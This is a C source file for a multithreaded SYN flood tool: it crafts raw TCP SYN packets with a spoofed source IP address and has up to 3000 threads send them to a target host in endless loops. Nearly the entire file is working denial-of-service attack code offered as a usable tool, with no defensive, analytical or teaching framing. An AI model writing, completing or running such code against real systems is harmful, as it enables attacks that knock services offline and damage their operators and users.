#include "synflood.h"
void * synFlood(void * arg)
{
    struct argMassive targ =
            *(struct argMassive *)arg;
    char * str = targ.addr;
    int pth = targ.pt;
    pthread_t * arrayPth=targ.arrPth;
    if(pth<=0 || pth >= 3000)
        err_sys("Error number of pthreds:");
//    printf("SynFlood\n"
//           "target:%s, pthreads:%d\n",str,pth);

    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

    //Datagram to represent the packet
    char datagram[4096] , source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    pthread_t thread;

    strcpy(source_ip , "192.168.0.2");

    sin.sin_family = AF_INET;
    sin.sin_port = htons(MYPORT);
    sin.sin_addr.s_addr = inet_addr (str);

    memset (datagram, 0, 4096); /* zero out the buffer */

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

    //TCP Header
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n"
                "Try run program with root privileges\n" , errno , strerror(errno));
        exit(0);
    }
    int i, pthreadResult;
    struct forSendFlood argv;
    argv.socket=s;
    argv.dgram=datagram;
    argv.tlen=iph->tot_len;
    argv.flags=0;
    argv.addr=(struct sockaddr *) &sin;
    argv.sizeAddr=sizeof (sin);
    for(i=0; i<pth;++i)
    {
        pthreadResult=pthread_create(&thread,NULL,&func_2,&argv);
        arrayPth[i]=thread;
        if(pthreadResult!=0)
            err_sys("Error pthread: %d",i);
    }
    while(1)
        sleep(10);
    return 0;
}

void * func_2(void * argv)
{
    struct  forSendFlood * arg = (struct forSendFlood *) argv;
        while (1)
        {
            //Send the packet
            if (
                    sendto ( arg->socket,      /* our socket */
                        arg->dgram,   /* the buffer containing headers and data */
                        arg->tlen,    /* total length of our datagram */
                        arg->flags,      /* routing flags, normally always 0 */
                        arg->addr,   /* socket addr, just like in */
                        arg->sizeAddr) < 0)       /* a normal send() */
            {
                printf ("error\n");
            }

            //Data send successfully
            else
            {
//                printf ("Packet Send \n");
            }
        }

    return NULL;
}
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}
